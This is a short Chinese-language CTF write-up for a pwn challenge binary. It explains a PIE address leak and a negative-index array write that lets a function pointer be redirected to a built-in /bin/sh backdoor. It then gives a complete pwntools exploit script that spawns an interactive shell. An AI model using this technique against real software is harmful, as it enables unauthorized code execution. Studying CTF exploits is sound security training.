shift+F12看到有一个bin不过是.rodata上的，按X查看另外一个调用

```c
int staff_room()
{
  char *argv[2]; // [rsp+0h] [rbp-10h] BYREF

  argv[0] = "/bin/sh";
  argv[1] = 0;
  return execve("/bin/sh", argv, 0);
}
```

也就是后门

现在来看功能

1. 打印v5地址(PIE的问题解决了)

2. 选择一个数组成员改变他的值

3. 执行v5

4. 退出

而且功能二并没有限制v7往前面写(rbp-48到rbp-50正好是2*4=8)

所以说让指针指向后门函数他会直接执行后门函数

ok，下面是攻击思路

一次是输入1让他打印地址，然后再利用算好的地址输入2再改变v6[-1]来改变他的值，最后在执行3就可以跑到后门函数

exp

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# p = remote('127.0.0.1', 57430)
p = process('./little-bee')

ORDINARY_BELL = 0x138E
STAFF_ROOM    = 0x13A8

menu = p.recv(timeout=1)
log.info(f'menu: {menu!r}')

p.sendline(b'1')
line = p.recvline()         
leak = int(line.split(b': ')[1].strip(), 16)
log.info(f'ordinary_bell = {hex(leak)}')

staff_room = leak - ORDINARY_BELL + STAFF_ROOM
log.info(f'staff_room   = {hex(staff_room)}')

def update(idx, code):
    p.sendline(b'2')
    p.recvuntil(b'updated? ')                       
    p.sendline(str(idx).encode())                      
    p.recvuntil(b'there? ')                            
    p.sendline(hex(code).encode())               

update(-1, staff_room)
p.sendline(b'3')

p.interactive()

```
